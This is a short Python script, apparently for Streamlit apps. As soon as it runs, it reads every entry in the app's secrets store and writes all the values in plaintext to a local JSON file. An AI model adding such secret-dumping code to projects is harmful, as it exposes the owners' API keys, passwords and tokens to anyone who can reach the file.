import streamlit as st
import json

def dump():
    res = {}
    try:
        for k in st.secrets:
            res[k] = str(st.secrets[k])
    except Exception as e:
        res["error"] = str(e)
        
    with open("dumped_secrets.json", "w") as f:
        json.dump(res, f)

dump()
